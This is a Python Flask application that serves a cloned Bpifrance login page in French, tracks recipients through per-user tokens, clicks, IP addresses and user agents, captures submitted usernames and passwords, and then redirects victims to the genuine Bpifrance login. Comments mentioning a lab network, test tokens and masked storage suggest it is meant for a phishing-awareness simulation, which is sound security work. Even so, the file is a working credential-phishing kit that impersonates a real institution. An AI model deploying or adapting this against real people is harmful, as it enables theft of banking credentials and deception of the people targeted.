#!/usr/bin/env python3

from flask import Flask, request, render_template_string, redirect
from datetime import datetime
import csv
from pathlib import Path
import json
from datetime import datetime, timezone
from pathlib import Path
from flask import request, render_template_string, jsonify
from flask import send_from_directory, abort
from pathlib import Path

APP_PORT = 5000
LOG_FILE = "clicks.csv"
SUBMISSIONS_FILE = "submissions.csv"
TOKEN_MAP_FILE = "users_map_token.csv"
ATTACHMENTS_DIR = Path(__file__).resolve().parent / "attachments"

app = Flask(__name__)

LANDING_HTML = """
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Offre exclusive</title></head>
<body>


<!DOCTYPE html>
<html lang="fr">
<head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
	<title>Connexion - Bpifrance</title>
	<style type="text/css">/* Basique, classique, pas de fonts externes ni librairies */
    :root {
      --bg: #ffffff;
      --text: #222;
      --muted: #666;
      --accent: #f6c400;
      --input-border: #ccc;
      --card-width: 480px;
    }

    html, body {
      height: 100%;
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font-family: Arial, Helvetica, sans-serif;
    }

    /* Centrer l'ensemble verticalement et horizontalement */
    .page {
      min-height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    /* Carte blanche contenant logo + formulaire */
    .card {
      width: 100%;
      max-width: var(--card-width);
      background: #fff;
      box-shadow: 0 6px 18px rgba(0,0,0,0.06);
      border-radius: 6px;
      padding: 28px;
      box-sizing: border-box;
    }

    /* Logo centré au milieu */
    .brand {
      display: flex;
      align-items: center;
      justify-content: center;   /* CENTRER horizontalement */
      margin-bottom: 18px;
    }
    .brand img {
      display:block;
      max-width: 220px;
      height: auto;
    }

    h1 {
      font-size: 18px;
      margin: 0 0 14px 0;
      color: var(--muted);
      text-align: left;
    }

    form { width: 100%; }

    label {
      display:block;
      font-weight: 600;
      margin-bottom: 6px;
      font-size: 14px;
    }

    .row {
      margin-bottom: 12px;
    }

    input[type="text"],
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      box-sizing: border-box;
      border: 1px solid var(--input-border);
      border-radius: 4px;
      font-size: 15px;
      background: #fff;
    }

    .small-link {
      float: right;
      font-size: 13px;
      color: #0b63d6;
      text-decoration: none;
    }
    .small-link:hover { text-decoration: underline; }

    .actions {
      display:flex;
      gap:12px;
      align-items:center;
      margin-top: 10px;
    }

    .btn {
      padding: 10px 16px;
      border-radius: 6px;
      border: none;
      cursor: pointer;
      font-weight:700;
      font-size:14px;
    }

    .btn-ghost {
      background:#efefef;
      color: #111;
    }

    .btn-primary {
      background: var(--accent);
      color: #111;
    }

    .footer {
      margin-top: 16px;
      font-size: 12px;
      color: #999;
    }

    /* Responsive simple */
    @media (max-width: 520px) {
      .card { padding: 18px; }
      .brand img { max-width: 180px; }
    }
	</style>
</head>
<body>
<div class="page">
<div class="card">
<div class="brand"><img alt="Bpifrance" src="https://storageprdv2inwink.blob.core.windows.net/cu-4fca10a0-d711-4c30-a65b-b2ccd4560137-public/84b6c04b-dd07-4bc2-956f-b40d8000bf22/assets/pictures/logo-bpifrance-SS_Reserve.png" /></div>

<h1>Connectez-vous &agrave; votre compte Bpifrance</h1>

<!--form action="" autocomplete="off" method="POST"-->

<form method="post" action="/submit"  autocomplete="off">

    <input type="hidden" name="token" value="{{ token }}"/>

    <div class="row"><label for="login">Identifiant (email ou nom d&#39;utilisateur) <a class="small-link" href="#" title="Mot de passe oublié">Mot de passe oubli&eacute; ?</a> </label> <input id="login" name="login" placeholder="Email ou nom d'utilisateur" required="" type="text" /></div>

    <div class="row"><label for="password">Mot de passe</label> <input id="password" name="password" placeholder="Mot de passe" required="" type="password" /></div>

    <div class="row" style="display:flex;align-items:center;gap:8px;"><input id="remember" name="remember" type="checkbox" /> <label for="remember" style="margin:0; font-weight:600;">Se souvenir de moi</label></div>

    <div class="actions"><!-- Pas de JS : les boutons n'ont pas d'action spéciale ici --><button class="btn btn-ghost" type="button">RETOUR</button><button class="btn btn-primary" type="submit">ME CONNECTER</button></div>

    <p class="footer">Ce site est h&eacute;berg&eacute; par inwink  pour le compte de Bpifrance. <a href="#" style="color:#0b63d6;text-decoration:none;">En savoir plus...</a></p>

    <p>Token de test : <code>{{ token }}</code></p>

</form>
</div>
</div>
</body>
</html>
"""

def append_click(row):
    header = ["timestamp","token","client_ip","user_agent"]
    exists = Path(LOG_FILE).exists()
    with open(LOG_FILE, "a", newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not exists:
            writer.writerow(header)
        writer.writerow(row)


def mask_value(v: str) -> str:
    """Masque la valeur: garder 2 premiers et 2 derniers caractères si possible, sinon remplace par étoiles."""
    if not v:
        return "-"
    s = str(v)
    n = len(s)
    if n <= 4:
        return "*" * n
    return s[:2] + "*" * (n - 4) + s[-2:]

def lookup_token_info_from_map(token, token_map_file=TOKEN_MAP_FILE):
    """Recherche token -> email,name dans token_map.csv"""
    p = Path(token_map_file)
    if not p.exists():
        return None
    with p.open(newline='', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        for r in reader:
            tok = (r.get("token") or "").strip()
            if tok and tok == token:
                return {"Email": (r.get("Email") or "-").strip(), "FirstName": (r.get("FirstName") or "-").strip()}
    return None

def append_submission_record(rec: dict):
    """Enregistre la soumission (masquée) dans submissions.csv"""
    header = ["timestamp","token","email","name","client_ip","user_agent","username_masked","username_length",
              "client_number_masked","client_number_length","referrer","full_url","headers_json"]
    p = Path(SUBMISSIONS_FILE)
    exists = p.exists()
    with p.open("a", newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not exists:
            writer.writerow(header)
        writer.writerow([rec.get(h, "-") for h in header])


@app.route("/attachments/<path:filename>")
def serve_attachment(filename):
    # sécurité : empêcher parcours de répertoire
    safe_file = (ATTACHMENTS_DIR / filename).resolve()
    if not str(safe_file).startswith(str(ATTACHMENTS_DIR.resolve())) or not safe_file.exists():
        abort(404)

    # si on veut forcer le téléchargement, accepter un param ?dl=1
    force_download = request.args.get("dl", "0") == "1"
    return send_from_directory(str(ATTACHMENTS_DIR), filename, as_attachment=force_download)

@app.route("/landing")
def landing():
    token = request.args.get("token","-")
    ts = datetime.now(timezone.utc).isoformat()
    client_ip = request.remote_addr
    ua = request.headers.get("User-Agent","-")
    append_click([ts, token, client_ip, ua])
    return render_template_string(LANDING_HTML, token=token)



@app.route("/submit", methods=["POST"])
def submit_form():
    # récupère champs
    token = (request.form.get("token") or "").strip()
    username = request.form.get("login", "").strip()
    password = request.form.get("password", "").strip()

    client_ip = request.remote_addr or "-"
    ua = request.headers.get("User-Agent", "-")
    ref = request.referrer or "-"
    full_url = request.url

    # lookup token -> email,name (si disponible)
    info = lookup_token_info_from_map(token) or {"Email": "-", "FirstName": "-"}

    # masquage : on ne stocke pas la valeur en clair
    uname_masked = mask_value(username)
    uname_len = len(username)
    password_masked = mask_value(password)
    password_len = len(password)

    # headers (sérialisés) pour debug (optionnel)
    headers_json = json.dumps({k: v for k, v in request.headers.items()}, ensure_ascii=False)

    rec = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "token": token or "-",
        "email": info["Email"],
        "name": info["FirstName"],
        "client_ip": client_ip,
        "user_agent": ua,
        "username_masked": uname_masked,
        "username_length": uname_len,
        "client_number_masked": password_masked,
        "client_number_length": password_len,
        "referrer": ref,
        "full_url": full_url,
        "headers_json": headers_json
    }

    append_submission_record(rec)

    # Redirection vers la vraie page de connexion Bpifrance
    return redirect("https://moncompte.bpifrance.fr/login", code=302)


if __name__ == "__main__":
    print(f"Starting Flask landing app on port {APP_PORT} (listen on 0.0.0.0 recommended for lab network)")
    app.run(host="0.0.0.0", port=APP_PORT)